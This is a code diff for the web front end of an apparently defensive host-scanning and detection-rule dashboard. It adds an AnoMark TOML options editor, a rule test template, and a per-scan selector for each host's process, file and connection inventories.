             <div class="rules-section-label">Rule source (TOML)</div>
             <div class="rules-editor-wrap">
               <textarea id="ruleTomlEditor" class="rules-editor" spellcheck="false">${esc(detail.toml || "")}</textarea>
@@ -6182,6 +6754,9 @@
     render();
     try {
       state.checkDetail = await api(`/v1/checks/${encodeURIComponent(id)}`);
+      if (state.checkDetail?.is_anomark && !(state._anomarkModels || []).length) {
+        await refreshAnoMark().catch(() => {});
+      }
       if (state.view === "checks") render();
     } catch (e) {
       toast(e.message || String(e));
@@ -9244,6 +9819,14 @@ evidence_fields = ["name", "pid", "exe"]
 attack = []
 rationale = "Describe why this is suspicious."
 false_positives = "Known benign cases."
+
+[test]
+fires_on = ["hostile-catalog"]
+silent_on = ["clean-ubuntu2204"]
+source = "collector"
+
+[test.expect]
+title_contains = "Custom rule"
 `;
       openDrawer("New rule", `
         <form class="form" id="newRuleForm">
@@ -9367,6 +9950,34 @@ false_positives = "Known benign cases."
         } catch (e) {
           toast(e.message);
         }
+      });
+    }
+    const applyAnomark = $("#btnApplyAnoMarkRule");
+    if (applyAnomark) {
+      applyAnomark.addEventListener("click", () => {
+        const ta = $("#ruleTomlEditor");
+        if (!ta) return;
+        const model = ($("#ruleAnomarkModel")?.value || "").trim();
+        const suspect = Number($("#ruleAnomarkSuspect")?.value || 95);
+        const maxCmd = Number($("#ruleAnomarkMax")?.value || 5000);
+        const tags = String($("#ruleAnomarkTags")?.value || "")
+          .split(",")
+          .map((s) => s.trim())
+          .filter(Boolean);
+        const tagsToml = tags.length
+          ? `tags = [${tags.map((t) => JSON.stringify(t)).join(", ")}]`
+          : "tags = []";
+        const block = `[anomark]\nmodel_id = ${JSON.stringify(model)}\nsuspect_percent = ${suspect}\n${tagsToml}\nmax_commands = ${maxCmd}\n`;
+        let text = ta.value;
+        if (/^\[anomark\]/m.test(text)) {
+          text = text.replace(/^\[anomark\][\s\S]*?(?=^\[|\z)/m, block);
+        } else {
+          text = `${text.trimEnd()}\n\n${block}`;
+        }
+        ta.value = text;
+        const hl = $("#ruleTomlHighlight");
+        if (hl && typeof highlightToml === "function") hl.innerHTML = highlightToml(text);
+        toast("AnoMark options applied to TOML — click Save TOML");
       });
     }
     const reloadRule = $("#btnReloadRule");
@@ -9494,10 +10105,17 @@ false_positives = "Known benign cases."
       const hostHash = `#host/${encodeURIComponent(h.id)}`;
       const hostAbs = hostPermalink(h.id);
       const virt = isVirtualHost(h);
+      if (!state._hostDetailScanByHost) state._hostDetailScanByHost = {};
+      const defaultScanId = String(hostScans[0]?.job?.id || hostScans[0]?.meta?.scan_id || "");
+      if (!state._hostDetailScanByHost[id] && defaultScanId) {
+        state._hostDetailScanByHost[id] = defaultScanId;
+      }
+      state._hostDetailScanId = state._hostDetailScanByHost[id] || defaultScanId || "";
+      const scanQ = hostInventoryScanQuery({ scanId: state._hostDetailScanId });
       const [procPack, filePack, connPack] = await Promise.all([
-        api(`/v1/hosts/${id}/processes?limit=50000`).catch(() => null),
-        api(`/v1/hosts/${id}/files?limit=50000`).catch(() => null),
-        api(`/v1/hosts/${id}/connections?limit=50000`).catch(() => null),
+        api(`/v1/hosts/${id}/processes?${scanQ}`).catch(() => null),
+        api(`/v1/hosts/${id}/files?${scanQ}`).catch(() => null),
+        api(`/v1/hosts/${id}/connections?${scanQ}`).catch(() => null),
       ]);
       const invCounts = {
         processes: Number(procPack?.count ?? 0),
@@ -9524,6 +10142,7 @@ false_positives = "Known benign cases."
           <button type="button" class="tab" data-host-tab="ops">Operations</button>
           <button type="button" class="tab" data-host-tab="raw">Raw JSON</button>
         </div>
+        ${hostScanPickerHtml(hostScans, state._hostDetailScanId)}
         <div data-host-pane="summary">
           <dl class="kv">
             <dt>Status</dt><dd><span class="host-status ${st.key}">${esc(st.label)}</span>
@@ -9532,10 +10151,21 @@ false_positives = "Known benign cases."
             <dt>Target</dt><dd class="mono">${esc(h.primary_addr || "—")}:${h.ssh_port || 22}</dd>
             <dt>Auth / outcome</dt><dd>${esc(st.auth || "—")}</dd>
             <dt>Last scan</dt><dd class="mono">${esc(fmtWhen(h.last_scan_at))}</dd>
-            <dt>Inventory</dt><dd>
+            <dt>Selected scan</dt><dd class="mono" id="hostDetailScanHint">${esc(
+              (() => {
+                const sid = state._hostDetailScanId
+                  || String(hostScans[0]?.job?.id || hostScans[0]?.meta?.scan_id || "");
+                if (!sid) return "latest available";
+                const s = hostScans.find((x) => String(x.job?.id || x.meta?.scan_id || "") === sid);
+                const when = s?.meta?.finished_at || s?.job?.created_at || "";
+                return `${shortId(sid)}${when ? ` · ${fmtWhen(when)}` : ""}`;
+              })()
+            )}</dd>
+            <dt>Inventory</dt><dd id="hostDetailInvCounts">
               <span class="mono">${esc(String(invCounts.processes))} processes</span>
               · <span class="mono">${esc(String(invCounts.files))} files</span>
               · <span class="mono">${esc(String(invCounts.connections))} connections</span>
+              <div class="muted" style="font-size:0.75rem">Counts for the selected scan (change above to compare history)</div>
             </dd>
             <dt>Open findings</dt><dd>${esc(pack.open_findings ?? findings.length)}</dd>
             <dt>Host key</dt><dd class="mono">${pack.host_key ? esc(`${pack.host_key.key_type} ${pack.host_key.fingerprint}`) : "(unpinned)"}</dd>
@@ -9558,45 +10188,39 @@ false_positives = "Known benign cases."
         </div>
         <div data-host-pane="processes" class="hidden">
           <div class="muted" style="margin-bottom:0.65rem">${virt
-            ? `Process inventory from ingested JSONL. Use <strong>Update</strong> to provide a new process or mixed PulseSecure snapshot (no SSH scan).`
-            : `Full process inventory from the latest scan that collected <span class="mono">process.inventory</span>.`}</div>
+            ? `Process inventory from the selected scan (or ingest JSONL when no scan rows).`
+            : `Process inventory from the <strong>selected scan</strong> above (falls back to latest if empty).`}</div>
           <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
-            <button type="button" class="btn ghost" id="btnLoadProcesses">Load processes</button>
+            <button type="button" class="btn ghost" id="btnLoadProcesses">Reload processes</button>
             ${virt
               ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
               : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
           </div>
-          <div id="hostProcessesPane"><div class="empty">${virt
-            ? `Click <strong>Load processes</strong>, or <strong>Update</strong> if no process JSONL is attached yet.`
-            : `Click <strong>Load processes</strong> to fetch the inventory.`}</div></div>
+          <div id="hostProcessesPane"><div class="empty">Loading…</div></div>
         </div>
         <div data-host-pane="files" class="hidden">
           <div class="muted" style="margin-bottom:0.65rem">${virt
-            ? `File inventory from ingested JSONL / PulseSecure <span class="mono">file_information</span> rows.`
-            : `File inventory from the latest scan that collected <span class="mono">file_meta</span> observations.`}</div>
+            ? `File inventory from the selected scan (or ingest JSONL when no scan rows).`
+            : `File inventory from the <strong>selected scan</strong> above.`}</div>
           <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
-            <button type="button" class="btn ghost" id="btnLoadFiles">Load files</button>
+            <button type="button" class="btn ghost" id="btnLoadFiles">Reload files</button>
             ${virt
               ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
               : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
           </div>
-          <div id="hostFilesPane"><div class="empty">${virt
-            ? `Click <strong>Load files</strong>, or import a snapshot that includes file rows.`
-            : `Click <strong>Load files</strong> to fetch the inventory.`}</div></div>
+          <div id="hostFilesPane"><div class="empty">Loading…</div></div>
         </div>
         <div data-host-pane="connections" class="hidden">
           <div class="muted" style="margin-bottom:0.65rem">${virt
-            ? `Open sockets come from imported snapshot scans (tree import) when present. Feed a mixed JSONL or use Import host tree — SSH scan is not used.`
-            : `Open TCP/UDP sockets from the latest scan that collected <span class="mono">net.sockets</span>.`}</div>
+            ? `Open sockets from the selected import snapshot when present.`
+            : `Open sockets from the <strong>selected scan</strong> above.`}</div>
           <div class="form-actions" style="justify-content:flex-start;margin-bottom:0.75rem">
-            <button type="button" class="btn ghost" id="btnLoadConnections">Load connections</button>
+            <button type="button" class="btn ghost" id="btnLoadConnections">Reload connections</button>
             ${virt
               ? `<button type="button" class="btn primary" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name || "")}">Update</button>`
               : `<button class="btn primary" data-scan-host="${esc(h.id)}">Scan now</button>`}
           </div>
-          <div id="hostConnectionsPane"><div class="empty">${virt
-            ? `No socket JSONL path yet — use <strong>Import host tree</strong> (PulseSecure) or wait for a snapshot scan.`
-            : `Click <strong>Load connections</strong> to fetch open sockets.`}</div></div>
+          <div id="hostConnectionsPane"><div class="empty">Loading…</div></div>
         </div>
         <div data-host-pane="scans" class="hidden">
           <p class="muted" style="margin:0 0 0.75rem;font-size:0.85rem">
@@ -9631,7 +10255,10 @@ false_positives = "Known benign cases."
                 <td><span class="pill neutral">${esc(stateLabel)}</span></td>
                 <td class="mono">${esc(String(fired))}/${esc(String(applicable))}</td>
                 <td>${(s.findings || []).length}</td>
-                <td class="row-actions"><button type="button" class="btn ghost tiny" data-open-scan="${esc(sid)}">Open</button></td>
+                <td class="row-actions">
+                  <button type="button" class="btn ghost tiny" data-use-inventory-scan="${esc(sid)}" title="Show Processes / Files / Connections from this scan">Inventory</button>
+                  <button type="button" class="btn ghost tiny" data-open-scan="${esc(sid)}">Open</button>
+                </td>
               </tr>`;
             }).join("")}
           </tbody></table>`}
@@ -9726,6 +10353,54 @@ false_positives = "Known benign cases."
       if (btnFiles) btnFiles.addEventListener("click", () => loadHostFiles(h.id, { virtual: virt }));
       const btnConn = $("#btnLoadConnections");
       if (btnConn) btnConn.addEventListener("click", () => loadHostConnections(h.id, { virtual: virt }));
+
+      const scanSel = $("#hostDetailScanSelect");
+      if (scanSel) {
+        scanSel.addEventListener("change", async () => {
+          const sid = scanSel.value || "";
+          state._hostDetailScanId = sid;
+          if (!state._hostDetailScanByHost) state._hostDetailScanByHost = {};
+          state._hostDetailScanByHost[h.id] = sid;
+          const hint = $("#hostDetailScanHint");
+          if (hint) {
+            const s = hostScans.find((x) => String(x.job?.id || x.meta?.scan_id || "") === sid);
+            const when = s?.meta?.finished_at || s?.job?.created_at || "";
+            hint.textContent = sid ? `${shortId(sid)}${when ? ` · ${fmtWhen(when)}` : ""}` : "latest available";
+          }
+          // Refresh counts + any open inventory pane.
+          try {
+            const q = hostInventoryScanQuery({ scanId: sid });
+            const [p, f, c] = await Promise.all([
+              api(`/v1/hosts/${h.id}/processes?${q}`).catch(() => null),
+              api(`/v1/hosts/${h.id}/files?${q}`).catch(() => null),
+              api(`/v1/hosts/${h.id}/connections?${q}`).catch(() => null),
+            ]);
+            const tabBtns = $$("[data-host-tab]");
+            const pc = Number(p?.count ?? 0);
+            const fc = Number(f?.count ?? 0);
+            const cc = Number(c?.count ?? 0);
+            tabBtns.forEach((b) => {
+              const tab = b.getAttribute("data-host-tab");
+              if (tab === "processes") b.textContent = `Processes (${pc})`;
+              if (tab === "files") b.textContent = `Files (${fc})`;
+              if (tab === "connections") b.textContent = `Connections (${cc})`;
+            });
+            const invDd = $("#hostDetailInvCounts");
+            if (invDd) {
+              invDd.innerHTML = `<span class="mono">${pc} processes</span>
+              · <span class="mono">${fc} files</span>
+              · <span class="mono">${cc} connections</span>
+              <div class="muted" style="font-size:0.75rem">Counts for the selected scan (change above to compare history)</div>`;
+            }
+          } catch (_) {}
+          const active = $$("[data-host-tab].active")[0]?.getAttribute("data-host-tab");
+          if (active === "processes") loadHostProcesses(h.id, { virtual: virt });
+          else if (active === "files") loadHostFiles(h.id, { virtual: virt });
+          else if (active === "connections") loadHostConnections(h.id, { virtual: virt });
+          toast(`Inventory scan → ${shortId(sid) || "latest"}`);
+        });
+      }
+
       $$("[data-host-tab]").forEach((btn) => {
         btn.addEventListener("click", () => {
           $$("[data-host-tab]").forEach((b) => b.classList.toggle("active", b === btn));
@@ -9798,6 +10473,20 @@ false_positives = "Known benign cases."
           if (sid) openScanById(sid).catch((err) => toast(err.message));
         });
       });
+      $$("[data-use-inventory-scan]", $("#drawerBody")).forEach((btn) => {
+        btn.addEventListener("click", (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          const sid = btn.getAttribute("data-use-inventory-scan") || "";
+          const sel = $("#hostDetailScanSelect");
+          if (!sel || !sid) return;
+          sel.value = sid;
+          sel.dispatchEvent(new Event("change"));
+          // Jump to processes so the selected scan’s inventory is visible.
+          const procTab = $$("[data-host-tab]").find((b) => b.getAttribute("data-host-tab") === "processes");
+          if (procTab) procTab.click();
+        });
+      });
       $$("[data-copy-host-link]", $("#drawerBody")).forEach((btn) => {
         btn.addEventListener("click", async (e) => {
           e.preventDefault();
@@ -9815,6 +10504,38 @@ false_positives = "Known benign cases."
     } catch (err) {
       toast(err.message);
     }
+  }
+
+  function hostInventoryScanQuery(opts) {
+    const parts = ["limit=50000"];
+    const scanId = (opts && opts.scanId) || state._hostDetailScanId || "";
+    if (scanId) parts.push(`scan_id=${encodeURIComponent(scanId)}`);
+    return parts.join("&");
+  }
+
+  function hostScanPickerHtml(hostScans, selectedScanId) {
+    const opts = (hostScans || []).map((s, i) => {
+      const j = s.job || {};
+      const m = s.meta || {};
+      const sid = String(j.id || m.scan_id || "");
+      if (!sid) return "";
+      const when = m.finished_at || j.created_at || "";
+      const setLabel = j.check_set || (m.probe_version === "virtual-import" ? "virtual-import" : "scan");
+      const label = `#${i + 1} · ${fmtWhen(when)} · ${setLabel} · ${shortId(sid)}`;
+      const sel = String(selectedScanId || "") === sid || (!selectedScanId && i === 0) ? "selected" : "";
+      return `<option value="${esc(sid)}" ${sel}>${esc(label)}</option>`;
+    }).filter(Boolean);
+    if (!opts.length) {
+      return `<div class="host-scan-picker muted" style="font-size:0.82rem;margin-bottom:0.65rem">No retained scans yet — inventory uses latest available data.</div>`;
+    }
+    return `<div class="host-scan-picker">
+      <label>Inventory scan
+        <select id="hostDetailScanSelect" class="ml-select" title="Which finished scan feeds Processes / Files / Connections">
+          ${opts.join("")}
+        </select>
+      </label>
+      <span class="muted" style="font-size:0.75rem">Applies to Processes, Files, and Connections</span>
+    </div>`;
   }
 
   function pathBytes(p) {
@@ -9835,15 +10556,17 @@ false_positives = "Known benign cases."
     const virt = !!(opts && opts.virtual);
     pane.innerHTML = `<div class="empty">Loading processes…</div>`;
     try {
-      const pack = await api(`/v1/hosts/${hostId}/processes`);
+      const pack = await api(`/v1/hosts/${hostId}/processes?${hostInventoryScanQuery(opts)}`);
       const rows = pack.processes || [];
       if (!rows.length) {
         pane.innerHTML = virt
-          ? `<div class="empty">No process JSONL yet. Use <strong>Feed / import file</strong> (process or mixed PulseSecure JSONL) — SSH scan is not used for virtual agents.</div>`
-          : `<div class="empty">No process inventory yet. Run a scan that includes <span class="mono">process.inventory</span>.</div>`;
+          ? `<div class="empty">No process rows for this scan. Try another inventory scan, or <strong>Update</strong> with process JSONL.</div>`
+          : `<div class="empty">No process inventory for this scan. Pick another scan above, or run a scan that includes <span class="mono">process.inventory</span>.</div>`;
         return;
       }
-      const src = pack.source === "virtual_ingest" ? "ingest JSONL" : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
+      const src = pack.source === "virtual_ingest"
+        ? "ingest JSONL"
+        : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
       const renderRows = (filterQ = "") => {
         const q = String(filterQ || "").toLowerCase().trim();
         const shown = !q ? rows : rows.filter((p) => {
@@ -9928,15 +10651,17 @@ false_positives = "Known benign cases."
     const virt = !!(opts && opts.virtual);
     pane.innerHTML = `<div class="empty">Loading files…</div>`;
     try {
-      const pack = await api(`/v1/hosts/${hostId}/files?limit=50000`);
+      const pack = await api(`/v1/hosts/${hostId}/files?${hostInventoryScanQuery(opts)}`);
       const rows = pack.files || [];
       if (!rows.length) {
         pane.innerHTML = virt
-          ? `<div class="empty">No file JSONL yet. Use <strong>Update</strong> with a mixed PulseSecure snapshot (or file_information rows).</div>`
-          : `<div class="empty">No file inventory yet. Run a scan that collects file metadata.</div>`;
+          ? `<div class="empty">No file rows for this scan. Try another inventory scan, or <strong>Update</strong> with file JSONL.</div>`
+          : `<div class="empty">No file inventory for this scan. Pick another scan above, or run a scan that collects file metadata.</div>`;
         return;
       }
-      const src = pack.source === "virtual_ingest" ? "ingest JSONL" : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
+      const src = pack.source === "virtual_ingest"
+        ? "ingest JSONL"
+        : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
       const renderRows = (filterQ = "") => {
         const q = String(filterQ || "").toLowerCase().trim();
         const shown = !q ? rows : rows.filter((f) => {
@@ -10000,12 +10725,12 @@ false_positives = "Known benign cases."
     const virt = !!(opts && opts.virtual);
     pane.innerHTML = `<div class="empty">Loading connections…</div>`;
     try {
-      const pack = await api(`/v1/hosts/${hostId}/connections`);
+      const pack = await api(`/v1/hosts/${hostId}/connections?${hostInventoryScanQuery(opts)}`);
       const rows = pack.connections || [];
       if (!rows.length) {
         pane.innerHTML = virt
-          ? `<div class="empty">No socket inventory yet. Import a PulseSecure host tree (or a snapshot that includes network_connection rows).</div>`
-          : `<div class="empty">No socket inventory yet. Run a scan that includes <span class="mono">net.sockets</span>.</div>`;
+          ? `<div class="empty">No socket inventory for this scan. Try another inventory scan or import a PulseSecure tree.</div>`
+          : `<div class="empty">No socket inventory for this scan. Pick another scan above, or run a scan that includes <span class="mono">net.sockets</span>.</div>`;
         return;
       }
       pane.innerHTML = `
